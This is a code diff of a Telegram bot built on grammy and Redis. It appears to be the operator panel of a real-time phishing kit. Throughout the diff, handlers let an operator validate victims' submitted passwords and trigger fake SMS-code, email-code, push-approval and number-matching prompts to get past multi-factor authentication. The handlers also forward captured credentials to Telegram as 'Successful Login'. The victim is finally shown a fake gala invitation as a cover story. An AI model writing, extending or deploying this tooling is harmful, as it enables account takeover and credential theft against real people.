@@ -2,20 +2,22 @@ import { Bot } from "grammy";
 import type { UserFromGetMe } from "grammy/types";
 import { Redis } from "@upstash/redis";
 import {
-  restartLeadSession,
+  readLeadSession,
+  writeLeadSession,
   updateLeadSession,
 } from "../methods/lead.methods.js";
 import { InlineKeyboard } from "grammy";
 import {
   callbackActions,
-  reviewCallbackData,
+  sanitizeCallbackData,
   callbackPatterns,
 } from "../methods/callback.methods.js";
-import { composeTelegramMessage } from "../methods/message.methods.js";
+import { composeMessage } from "../methods/message.methods.js";
 import {
-  buildSessionOptions,
-  renderSessionCard,
-} from "../methods/session.methods.js";
+  buildLeadSessionKeyboardForTelegram,
+  sendMessageToTelegram,
+  sendSessionToTelegram,
+} from "../methods/telegram.methods.js";
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID?.trim();
@@ -118,28 +120,22 @@ bot.callbackQuery(callbackPatterns.auth, async (context) => {
       feedback: pass
         ? "Proceeding to the next step..."
         : action === "flag"
-          ? "Password is incorrect. Please try again."
+          ? "Incorrect password. Please try again with the correct password."
           : `Invalid account. Try again with a different email address.`,
-      logEntry: composeTelegramMessage(
-        pass ? "✅ Correct credentials" : "❌ Invalid credentials",
-        pass ? "🚀 Select what's next" : undefined,
-      ),
+      logEntry: pass ? "✅ Correct credentials" : "❌ Invalid credentials",
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
     if (pass) {
-      await renderSessionCard(
+      await sendSessionToTelegram(session, {
         context,
-        sessionId,
-        session,
-        buildSessionOptions(sessionId, session),
-      );
+        keyboard: buildLeadSessionKeyboardForTelegram(session),
+        logEntry: "🚀 Select what's next",
+      });
     } else {
-      await renderSessionCard(
+      await sendSessionToTelegram(session, {
         context,
-        sessionId,
-        session,
-        new InlineKeyboard(),
-      );
+        keyboard: new InlineKeyboard(),
+      });
     }
   } catch (error) {
     console.error("Lead review callback failed:", error);
@@ -147,13 +143,13 @@ bot.callbackQuery(callbackPatterns.auth, async (context) => {
 });
 
 bot.callbackQuery(callbackPatterns.code, async (context) => {
-  const [, anchor, type] = context.match;
+  const [, sessionId, type] = context.match;
   const typeName = type === "sms" ? "SMS code" : "email code";
   await context.answerCallbackQuery({
     text: `Sending ${typeName} verification request...`,
   });
   try {
-    const session = await updateLeadSession(anchor, {
+    const session = await updateLeadSession(sessionId, {
       status: "idle",
       process: type === "sms" ? "verify-sms-code" : "verify-email-code",
       feedback:
@@ -163,23 +159,21 @@ bot.callbackQuery(callbackPatterns.code, async (context) => {
       logEntry: `🏹 Sent ${typeName} verification request`,
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    await sendSessionToTelegram(session, {
       context,
-      anchor,
-      session,
-      new InlineKeyboard()
+      keyboard: new InlineKeyboard()
         .text(
           `Resend ${typeName}`,
-          reviewCallbackData(
-            anchor,
+          sanitizeCallbackData(
+            sessionId,
             type === "sms"
               ? callbackActions.smsCode
               : callbackActions.emailCode,
           ),
         )
         .primary(),
-      composeTelegramMessage(session.logs),
-    );
+      logEntry: "⏳ Waiting for user to enter the code...",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -211,22 +205,18 @@ bot.callbackQuery(callbackPatterns.codeDecision, async (context) => {
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
     if (pass) {
-      await renderSessionCard(
+      await sendSessionToTelegram(session, {
         context,
-        sessionId,
-        session,
-        buildSessionOptions(sessionId, session),
-        composeTelegramMessage(session.logs, "🚀 Select what's next"),
-      );
+        keyboard: buildLeadSessionKeyboardForTelegram(session),
+        logEntry: "🚀 Select what's next",
+      });
     } else {
-      await renderSessionCard(
+      await sendSessionToTelegram(session, {
         context,
-        sessionId,
-        session,
-        new InlineKeyboard()
+        keyboard: new InlineKeyboard()
           .text(
             `Resend ${typeName}`,
-            reviewCallbackData(
+            sanitizeCallbackData(
               sessionId,
               type === "sms"
                 ? callbackActions.smsCode
@@ -234,8 +224,7 @@ bot.callbackQuery(callbackPatterns.codeDecision, async (context) => {
             ),
           )
           .primary(),
-        composeTelegramMessage(session.logs),
-      );
+      });
     }
   } catch (error) {
     console.error("Lead review callback failed:", error);
@@ -248,26 +237,24 @@ bot.callbackQuery(callbackPatterns.emailLink, async (context) => {
     text: `Sending email link verification request...`,
   });
   try {
-    const channel = await updateLeadSession(sessionId, {
+    const session = await updateLeadSession(sessionId, {
       status: "idle",
       process: "verify-email-link",
       feedback:
         "Please check your inbox and click the verification link we sent you.",
       logEntry: "🏹 Sent email link verification request",
     });
-    if (!channel) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      channel,
-      new InlineKeyboard()
+      keyboard: new InlineKeyboard()
         .text(
           "Acknowledge Verification",
-          reviewCallbackData(sessionId, callbackActions.verifyLinkApprove),
+          sanitizeCallbackData(sessionId, callbackActions.verifyLinkApprove),
         )
         .success(),
-      composeTelegramMessage(channel.logs),
-    );
+      logEntry: "⏳ Waiting for you to acknowledge link click...",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -284,16 +271,14 @@ bot.callbackQuery(callbackPatterns.emailLinkApprove, async (context) => {
       process: "verify-email-link",
       feedback: "Proceeding to the next step...",
       overload: ["email-link"],
-      logEntry: "✅ Email Link Clicked",
+      logEntry: "✅ Email Link Clicked Successfully",
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      session,
-      buildSessionOptions(sessionId, session),
-      composeTelegramMessage(session.logs, "🚀 Select what's next"),
-    );
+      keyboard: buildLeadSessionKeyboardForTelegram(session),
+      logEntry: "🚀 Select what's next",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -305,138 +290,139 @@ bot.callbackQuery(callbackPatterns.promptYes, async (context) => {
     text: `Sending prompt yes verification request...`,
   });
   try {
-    const channel = await updateLeadSession(sessionId, {
+    const session = await updateLeadSession(sessionId, {
       status: "idle",
       process: "verify-prompt-yes",
       feedback: "Yes",
       logEntry: "🏹 Sent prompt yes verification request",
     });
-    if (!channel) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      channel,
-      new InlineKeyboard()
+      keyboard: new InlineKeyboard()
         .text(
           "Acknowledge Verification",
-          reviewCallbackData(sessionId, callbackActions.verifyPromptYesApprove),
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.verifyPromptYesApprove,
+          ),
         )
         .success(),
-      composeTelegramMessage(channel.logs),
-    );
+      logEntry: "⏳ Waiting for you to acknowledge tap yes...",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
 });
 
 bot.callbackQuery(callbackPatterns.promptYesApprove, async (context) => {
-  const [, anchor] = context.match;
+  const [, sessionId] = context.match;
   await context.answerCallbackQuery({
     text: "Approving prompt yes verification request.",
   });
   try {
-    const session = await updateLeadSession(anchor, {
+    const session = await updateLeadSession(sessionId, {
       status: "passing",
       process: "verify-prompt-yes",
       feedback: "Proceeding to the next step...",
       overload: ["prompt-yes"],
-      logEntry: "✅ Prompt Yes Successful",
+      logEntry: "✅ Prompt Yes Verified Successfully",
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    await sendSessionToTelegram(session, {
       context,
-      anchor,
-      session,
-      buildSessionOptions(anchor, session),
-      composeTelegramMessage(session.logs, "🚀 Select what's next"),
-    );
+      keyboard: buildLeadSessionKeyboardForTelegram(session),
+      logEntry: "🚀 Select what's next",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
 });
 
-bot.callbackQuery(callbackPatterns.promptNumPage, async (context) => {
-  const [, anchor, pageNumber] = context.match;
+bot.callbackQuery(callbackPatterns.promptNum, async (context) => {
+  const [, sessionId, pageNumNull] = context.match;
+  const pageNum = pageNumNull || "0";
   await context.answerCallbackQuery();
   try {
-    const channel = await updateLeadSession(anchor, {
-      status: "loading",
-      feedback: "Sending to notification to your mobile phone...",
-      logEntry: "📍 Select the number they need to tap",
-    });
-    if (!channel) throw new Error("Invalid sessionId or expired session.");
+    const session = !pageNumNull
+      ? await updateLeadSession(sessionId, {
+          status: "loading",
+          feedback: "Sending to notification to your mobile phone...",
+          logEntry: "📍 Select the number they need to tap",
+        })
+      : await readLeadSession(sessionId);
+    if (!session) throw new Error("Invalid sessionId or expired session.");
     let keyboard = new InlineKeyboard();
-    const startNum = parseInt(pageNumber) * 25 + 1;
-    const endNum = startNum + 24;
+    const startNum = parseInt(pageNum) * 50 + 1;
+    const endNum = startNum + 49;
+    if (startNum >= 51) {
+      keyboard = keyboard
+        .row()
+        .text(
+          `${startNum - 50} to ${startNum - 1}`,
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.promptNum(parseInt(pageNum) - 1),
+          ),
+        )
+        .danger()
+        .row();
+    }
     for (let i = startNum; i <= endNum; i++) {
       keyboard = keyboard.text(
         `${i}`,
-        reviewCallbackData(anchor, callbackActions.promptNumValue(i)),
+        sanitizeCallbackData(sessionId, callbackActions.promptNumValue(i)),
       );
       if (i % 2 === 0) keyboard = keyboard.primary();
       if (i % 5 === 0) keyboard = keyboard.row();
     }
     if (endNum % 5 !== 0) keyboard = keyboard.row();
-    if (parseInt(pageNumber) > 0) {
-      keyboard = keyboard
-        .row()
-        .text(
-          "Back",
-          reviewCallbackData(
-            anchor,
-            callbackActions.promptNumPage(parseInt(pageNumber) - 1),
-          ),
-        )
-        .danger();
-    }
-    if (parseInt(pageNumber) < 3) {
+    if (endNum <= 50) {
       keyboard = keyboard
         .text(
-          "Next",
-          reviewCallbackData(
-            anchor,
-            callbackActions.promptNumPage(parseInt(pageNumber) + 1),
+          `${endNum + 1} to ${endNum + 50}`,
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.promptNum(parseInt(pageNum) + 1),
           ),
         )
         .success();
     }
-    await renderSessionCard(
+    await sendSessionToTelegram(session, {
       context,
-      anchor,
-      channel,
       keyboard,
-      composeTelegramMessage(channel.logs),
-    );
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
 });
 
 bot.callbackQuery(callbackPatterns.promptNumValue, async (context) => {
-  const [, sessionId, number] = context.match;
+  const [, sessionId, valueNum] = context.match;
   await context.answerCallbackQuery({
     text: `Sending prompt num verification request...`,
   });
   try {
-    const channel = await updateLeadSession(sessionId, {
+    const session = await updateLeadSession(sessionId, {
       status: "idle",
       process: "verify-prompt-num",
-      feedback: `${number}`,
+      feedback: `${valueNum}`,
       logEntry: "🏹 Sent prompt num verification request",
     });
-    if (!channel) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      channel,
-      new InlineKeyboard()
+      keyboard: new InlineKeyboard()
         .text(
           "Acknowledge Verification",
-          reviewCallbackData(sessionId, callbackActions.verifyPromptNumApprove),
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.verifyPromptNumApprove,
+          ),
         )
         .success(),
-      composeTelegramMessage(channel.logs),
-    );
+      logEntry: "⏳ Waiting for you to acknowledge tap the number...",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -456,13 +442,11 @@ bot.callbackQuery(callbackPatterns.promptNumApprove, async (context) => {
       logEntry: "✅ Prompt Number Successful",
     });
     if (!session) throw new Error("Invalid sessionId or expired session.");
-    await renderSessionCard(
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      session,
-      buildSessionOptions(sessionId, session),
-      composeTelegramMessage(session.logs, "🚀 Select what's next"),
-    );
+      keyboard: buildLeadSessionKeyboardForTelegram(session),
+      logEntry: "🚀 Select what's next",
+    });
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -472,25 +456,30 @@ bot.callbackQuery(callbackPatterns.complete, async (context) => {
   const [, sessionId] = context.match;
   await context.answerCallbackQuery({ text: "Completing..." });
   try {
-    const session = await updateLeadSession(sessionId, {
+    const session = await readLeadSession(sessionId);
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    await sendMessageToTelegram(
+      composeMessage(session.credentials, "🔐 Successful Login"),
+      {
+        context,
+        keyboard: new InlineKeyboard().text(
+          "Restart",
+          sanitizeCallbackData(sessionId, callbackActions.restart),
+        ),
+      },
+    );
+    const seatIndex = (session.logs.length + session.credentials.length) % 99;
+    const seatRow = ["A", "B", "C", "D", "E"][session.credentials.length % 5];
+    await writeLeadSession(sessionId, {
       status: "completed",
       process: "init",
+      keepStanding: true,
       feedback:
-        "We've sent your invitation card to your email address. " +
-        "Stay tunned for follow up instructions.",
+        `We look forward to seeing you at Annual Gala Night - ${new Date().getFullYear()} Edition!\n` +
+        `Your seat is labeled ${seatIndex + 1} at row ${seatRow}\n` +
+        "We will send you the official invitation two weeks before the event. # Gala Vibes Only #",
     });
-    if (!session) throw new Error("Invalid sessionId or expired session.");
     context.deleteMessage().catch(() => {});
-    await renderSessionCard(
-      context,
-      sessionId + "-completed",
-      session,
-      new InlineKeyboard().text(
-        "Restart",
-        reviewCallbackData(sessionId, callbackActions.restart),
-      ),
-      composeTelegramMessage(session.credentials, "🔐 Successful Login"),
-    );
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
@@ -498,19 +487,55 @@ bot.callbackQuery(callbackPatterns.complete, async (context) => {
 
 bot.callbackQuery(callbackPatterns.restart, async (context) => {
   const [, sessionId] = context.match;
-  await context.answerCallbackQuery({ text: "Restarting..." });
+  await context.answerCallbackQuery({ text: "Confirming Restart..." });
   try {
-    const session = await restartLeadSession(sessionId, {
-      keepMessageId: true,
-      status: "idle",
-    });
-    await renderSessionCard(
+    const session = await readLeadSession(sessionId);
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    await sendSessionToTelegram(session, {
       context,
-      sessionId,
-      session,
-      new InlineKeyboard(),
-      composeTelegramMessage(session.logs, "🔄 Restarted Session"),
-    );
+      keyboard: new InlineKeyboard()
+        .text(
+          "Yes, Restart",
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.restartDecision("yes"),
+          ),
+        )
+        .danger()
+        .text(
+          "No, Cancel",
+          sanitizeCallbackData(
+            sessionId,
+            callbackActions.restartDecision("no"),
+          ),
+        )
+        .success(),
+      logEntry: "⚠️ Are you sure you want to restart this session?",
+    });
+  } catch (error) {
+    console.error("Lead review callback failed:", error);
+  }
+});
+
+bot.callbackQuery(callbackPatterns.restartDecision, async (context) => {
+  const [, sessionId, decision] = context.match;
+  await context.answerCallbackQuery({ text: `Restarting...` });
+  try {
+    if (decision == "yes") {
+      const session = await writeLeadSession(sessionId, {
+        keepStanding: true,
+        status: "idle",
+      });
+      await sendSessionToTelegram(session, {
+        context,
+        keyboard: new InlineKeyboard(),
+        logEntry: "🔄 Restarted Session",
+      });
+    } else {
+      const session = await readLeadSession(sessionId);
+      if (!session) throw new Error("Invalid sessionId or expired session.");
+      context.deleteMessage().catch(() => {});
+    }
   } catch (error) {
     console.error("Lead review callback failed:", error);
   }
